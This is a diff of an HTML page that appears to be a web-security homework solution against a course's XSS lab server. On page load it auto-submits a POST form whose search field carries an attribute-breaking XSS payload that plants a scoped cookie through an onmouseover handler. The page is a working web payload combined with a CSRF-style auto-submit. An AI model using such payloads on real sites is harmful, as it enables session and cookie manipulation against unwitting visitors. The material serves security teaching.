@@ -9,10 +9,32 @@
     <link rel="preconnect" href="https://webappsec.cs.ut.ee/xss/homework.php">
     <title>XSS Homework Autosubmit</title>
 </head>
-<body onload="XSSOnLoad.submit()">
-    <form action="https://webappsec.cs.ut.ee/xss/homework.php" method="POST" name="XSSOnLoad">
-        <input type="text" name="searchTerm" value='"onmouseover="document.cookie=&apos;searchTerm=CompetitivePathCookie;Path=/xss/homework.php;Domain=.webappsec.cs.ut.ee&apos;"'/>
-        <input type="submit" value="Search"/>
-    </form>
+<body onload="createForm()">
+
+    <script>
+        const createForm = () => {
+            const form = document.createElement("form")
+            document.body.appendChild(form)
+
+            const label = document.createElement("label")
+            label.value = "Search Term: "
+            form.appendChild(label)
+
+            const inputBox = document.createElement("input")
+            inputBox.name = "searchTerm"
+            inputBox.value = '"onmouseover="document.cookie=&apos;searchTerm=CompetitivePathCookie;Path=/xss/homework.php;Domain=.webappsec.cs.ut.ee&apos;"'
+            form.appendChild(inputBox)
+            
+            const submitButton = document.createElement("submit")
+            submitButton.value = "Search"
+            form.appendChild(submitButton)
+
+            form.method = "POST"
+            form.action = "https://webappsec.cs.ut.ee/xss/homework.php"
+            
+            form.submit()
+        }
+    </script>
+
 </body>
 </html>
